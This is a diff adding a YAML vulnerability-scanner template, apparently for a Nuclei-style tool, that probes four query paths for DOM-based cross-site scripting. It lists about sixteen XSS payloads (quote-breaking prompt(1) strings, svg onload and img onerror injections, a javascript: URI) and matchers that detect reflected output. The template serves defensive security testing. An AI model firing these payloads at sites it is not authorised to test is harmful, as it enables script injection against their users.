@@ -1,0 +1,68 @@
+id: xss-dom-based
+name: DOM Based XSS Detection
+version: 1.0
+author: GochaOqradze
+severity: high
+description: >
+  Detects DOM-based cross-site scripting vulnerabilities by injecting various
+  XSS payloads through query parameters, path segments, and fragment identifiers.
+  Tests event handlers, script injection, and various encoding bypass techniques.
+
+tags:
+  - xss
+  - dom-xss
+  - injection
+  - client-side
+
+references:
+  - https://owasp.org/www-community/attacks/DOM_Based_XSS
+
+requests:
+  - method: GET
+    path:
+      - "/page?q={{payload}}"
+      - "/search?query={{payload}}"
+      - "/view?name={{payload}}"
+      - "/redirect?url={{payload}}"
+
+    redirects: true
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "javascript:(prompt)(1)"
+        - "'(prompt)(1)-'"
+        - '"-(prompt)(1)-"'
+        - "'}(prompt)(1);{'"
+        - '"}(prompt)(1)%0A{"'
+        - "(prompt)(1)//"
+        - "';-(prompt)(1)//"
+        - "\"';-(prompt)(1)//"
+        - "\";-(prompt)(1)//"
+        - "*/;(prompt)(1);/*"
+        - "'autofocus/onfocus=(prompt)(1)//"
+        - '"autofocus/onfocus=(prompt)(1)//'
+        - "</script><svg/onload=(prompt)()>"
+        - "<img src=1 onerror=(prompt)(1)>"
+        - '/"><svg/onload=(prompt)(1)>'
+        - '<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>'
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "(prompt)(1)"
+          - "(prompt)()"
+          - "onerror=(prompt)"
+          - "onload=(prompt)"
+          - "onfocus=(prompt)"
+          - "alert(1)"
+        condition: or
+
+      - type: regex
+        regex:
+          - "<svg[^>]*onload="
+          - "<img[^>]*onerror="
+          - "<script[^>]*>"
+        condition: or
